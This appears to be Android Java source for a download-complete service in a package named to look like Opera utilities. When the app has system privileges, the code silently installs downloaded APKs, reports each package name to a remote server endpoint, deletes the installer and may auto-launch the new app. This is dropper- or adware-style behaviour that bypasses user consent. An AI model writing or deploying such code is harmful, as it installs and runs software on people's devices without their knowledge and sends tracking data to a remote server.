package com.opera.utils.services;

import java.io.File;
import com.opera.utils.utils.HttpUtil;
import com.opera.utils.utils.MyHelpUtil;
import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.app.IntentService;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;

public class DowCplService extends IntentService {

	public DowCplService(String name) {
		super("DowCplService");
		// TODO Auto-generated constructor stub
	}

	public DowCplService() {
		super("DowCplService");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent arg0) {

		long download_id = arg0.getLongExtra("download_id", -1);

		DownloadManager downloadManager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);

		Query query = new Query();

		query.setFilterById(download_id);

		Cursor cursor = downloadManager.query(query);

		try {

			int col_file_uri = cursor
					.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);

			if (cursor.moveToNext()) {

				String localuri = cursor.getString(col_file_uri);

				PackageInfo pi = getPackageManager().getPackageArchiveInfo(
						Uri.parse(localuri).getPath(), 0);

				if (pi != null) {

					int isSystemApp = MyHelpUtil
							.isSystemApp(getApplicationContext());

					if (isSystemApp == 0) {

						/* Sys */
						sysDownComple(pi.packageName);

						int i = MyHelpUtil.install(Uri.parse(localuri)
								.getPath());

						System.out.println("静默：安装返回结果：" + i);

						if (i == 1) {

							File file = new File(Uri.parse(localuri).getPath());

							if (file.exists()) {

								file.delete();

								return;
							}
						}

						if (i == 0) {

							SilentService s = new SilentService(
									getApplicationContext());

							s.sysInstall(pi.packageName);

							s.saveSilentStatus();

							if (s.checkOpenTime()) {

								MyHelpUtil.openApp(pi.packageName,
										getApplicationContext());

								s.synchroOpenData(pi.packageName);

								s.openApp();

							}

						}

					} else {
						/* sys_msgDownloadComplete- */
						MyHelpUtil.sys_msg(getApplicationContext(), 15,
								pi.packageName);

						Intent installIntent = new Intent(Intent.ACTION_VIEW);

						installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

						installIntent.setDataAndType(
								Uri.parse(cursor.getString(col_file_uri)),
								"application/vnd.android.package-archive");

						startActivity(installIntent);
					}
				}
			}
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}
	}

	private void sysDownComple(String apppakname) {

		String params = MyHelpUtil.setParams(apppakname, 4,
				getApplicationContext());

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_e.action", params);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
